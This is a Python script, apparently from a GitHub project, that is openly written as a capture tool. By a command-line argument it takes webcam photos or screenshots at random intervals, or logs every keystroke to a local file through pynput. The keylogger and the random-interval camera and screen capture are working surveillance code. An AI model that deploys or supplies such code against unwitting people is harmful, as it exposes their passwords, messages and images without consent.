# Github: https://github.com/jpdoshi

# Important:
# Check out README.md and read it carefully about usage of this script

# built-in packages
import json
import os
import sys
import random
import time
import logging
from datetime import datetime

# install packages
from cv2 import VideoCapture, imwrite
from pynput.keyboard import Key, Listener
import pyautogui


# read minimum delay in seconds
def getMinDelay():
  configFile = open('config.json')
  configData = json.load(configFile)
  return configData['minDelay']


# read maximum delay in seconds
def getMaxDelay():
  configFile = open('config.json')
  configData = json.load(configFile)
  return configData['maxDelay']


# check whether config file is present
def checkConfig():
  configFile = open('config.json')

  # create folder to store screenshots
  if not os.path.exists('Screen'):
    os.mkdir('Screen')
  
  # create folder to store webcam images
  if not os.path.exists('Webcam'):
    os.mkdir('Webcam')

  # show if file does not exist
  if not configFile:
    print('Could not read configuration file...')

  # read data from config file
  else:
    configData = json.load(configFile)

    minDelay = configData['minDelay']
    maxDelay = configData['maxDelay']

    # debug data in CLI
    print('\n::CONFIGURATION::\n')
    print('Minimum Delay: ', minDelay)
    print('Maximum Delay: ', maxDelay, '\n')


# function to save webcam images
def captureWebcam():
  print('Capturing Webcam...')

  while True:
    randomDelay = random.randint(getMinDelay(), getMaxDelay())
    now = datetime.now()
    
    currTime = now.strftime('%H-%M-%S')
    currDate = now.strftime('%d-%m-%Y')
    webcam = VideoCapture(0)
    
    if not os.path.exists('Webcam/' + currDate):
      os.mkdir('Webcam/' + currDate)
    
    savefileName = 'Webcam/' + currDate + '/' + currTime + '.png'
    result, image = webcam.read()

    imwrite(savefileName, image)    
    time.sleep(randomDelay)


# function to save screenshots
def captureScreen():
  print('Capturing Screen...')
  
  while True:
    randomDelay = random.randint(getMinDelay(), getMaxDelay())
    now = datetime.now()
    
    currTime = now.strftime('%H-%M-%S')
    currDate = now.strftime('%d-%m-%Y')
    
    if not os.path.exists('Screen/' + currDate):
      os.mkdir('Screen/' + currDate)
    
    savefileName = 'Screen/' + currDate + '/' + currTime + '.png'
    img = pyautogui.screenshot()
    
    img.save(savefileName)
    time.sleep(randomDelay)

# function to save keylog
def captureKeyboard():
  print('Capturing Keyboard...')
  logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")

  def on_press(key):
    logging.info(str(key))

  with Listener(on_press=on_press) as listener:
    listener.join()


# initialize program
if __name__ == '__main__':
  try:
    checkConfig()

    if sys.argv[1] == 'webcam':
      captureWebcam()
    
    if sys.argv[1] == 'screen':
      captureScreen()

    if sys.argv[1] == 'keyboard':
      captureKeyboard()

  except KeyboardInterrupt:
    print('Capture Complete...')
